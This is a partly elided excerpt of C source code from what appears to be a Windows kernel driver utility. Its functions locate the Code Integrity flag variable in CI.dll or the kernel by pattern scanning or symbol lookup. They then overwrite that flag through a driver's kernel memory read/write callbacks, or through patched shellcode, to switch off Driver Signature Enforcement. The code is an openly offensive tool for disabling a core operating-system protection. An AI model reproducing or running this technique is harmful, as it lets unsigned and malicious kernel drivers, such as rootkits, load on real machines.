 ...
 *  Note:
 *
 *  Since Windows 11 the entire CiPolicy section of CI.dll is virtual memory
 * write protected. Attempt to write there will result in a bugcheck.
 *
 ...
 *
 */
ULONG KDUpValidateInstructionBlock(_In_ PBYTE Code,
                                   _In_ ULONG Offset,
 ...
 *
 */
NTSTATUS KDUQueryCiEnabled(_In_ HMODULE ImageMappedBase,
 ...
 * Depending on current Windows version it will look for target value
 * differently.
 *
 * Params:
 *
 ...
 *
 */
NTSTATUS KDUQueryCiOptions(_In_ HMODULE ImageMappedBase,
                           _In_ ULONG_PTR ImageLoadedBase,
                           _Out_ ULONG_PTR* ResolvedAddress,
 ...
 *
 */
ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(_In_ ULONG NtBuildNumber) {
    ...
    //
    mappedImageBase =
        LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {
        ...
        if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {
            if (symLookupAddressBySymbol(lpSymbolName, &kernelAddress)) {
                Result = (ULONG_PTR)imageLoadedBase + kernelAddress -
                         (ULONG_PTR)mappedImageBase;
                supPrintfEvent(kduEventInformation,
                               "[+] Symbol resolved to 0x%llX address\r\n",
                               Result);

            } else {
                supPrintfEvent(kduEventError,
                               "[!] Unable to find specified symbol\r\n");
            }
 ...
 *
 */
ULONG_PTR KDUQueryCodeIntegrityVariableAddress(_In_ ULONG NtBuildNumber) {
    NTSTATUS ntStatus;
    ...
    if (mappedImageBase) {
        ...
        if (NtBuildNumber < NT_WIN8_RTM) {
            ntStatus = supQueryImageSize(mappedImageBase, &sizeOfImage);

            if (NT_SUCCESS(ntStatus)) {
                ntStatus = KDUQueryCiEnabled(mappedImageBase, imageLoadedBase,
                                             &kernelAddress, sizeOfImage);
            }

        } else {
            ntStatus = KDUQueryCiOptions(mappedImageBase, imageLoadedBase,
                                         &kernelAddress, NtBuildNumber);
        }
        ...
        if (NT_SUCCESS(ntStatus)) {
            if (IN_REGION(kernelAddress, imageLoadedBase, loadedImageSize)) {
                ...
                supPrintfEvent(kduEventError,
                               "[!] Resolved address 0x%llX does not belong "
                               "required module.\r\n",
                               kernelAddress);
            }

        } else {
            supShowHardError("[!] Failed to locate kernel variable address",
                             ntStatus);
        }
 ...
 *
 */
BOOL KDUControlDSE2(_In_ PKDU_CONTEXT Context,
                    _In_ ULONG DSEValue,
    ...
    if (shellSize < 20) {
        supPrintfEvent(kduEventError,
                       "[!] Shellcode too small for required patch offsets "
                       "(size=0x%llX)\r\n",
                       shellSize);
        return FALSE;
    }
 ...
 *
 */
BOOL KDUControlDSE(_In_ PKDU_CONTEXT Context,
                   _In_ ULONG DSEValue,
                   _In_ ULONG_PTR Address) {
    BOOL bResult = FALSE;
    ULONG ulFlags = 0;
    ...
    //
    bResult = Context->Provider->Callbacks.ReadKernelVM(
        Context->DeviceHandle, Address, &ulFlags, sizeof(ulFlags));

    if (!bResult) {
        supShowWin32Error("[!] Cannot query DSE state", GetLastError());
    } else {
        printf_s(
            "[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
            (PVOID)Address, ulFlags, DSEValue);

        if (DSEValue == ulFlags) {
            printf_s(
                "[~] Warning, current value is identical to what you want to "
                "write\r\n");
        }
        ...
        bResult = Context->Provider->Callbacks.WriteKernelVM(
            Context->DeviceHandle, Address, &DSEValue, sizeof(DSEValue));
        ...
        if (bResult) {
            ...
            if (bResult) {
                ...
                supShowWin32Error("[!] Cannot verify kernel memory write",
                                  dwLastError);
            }
        } else {
            supShowWin32Error("[!] Error while writing to the kernel memory",
                              dwLastError);
        }
    }
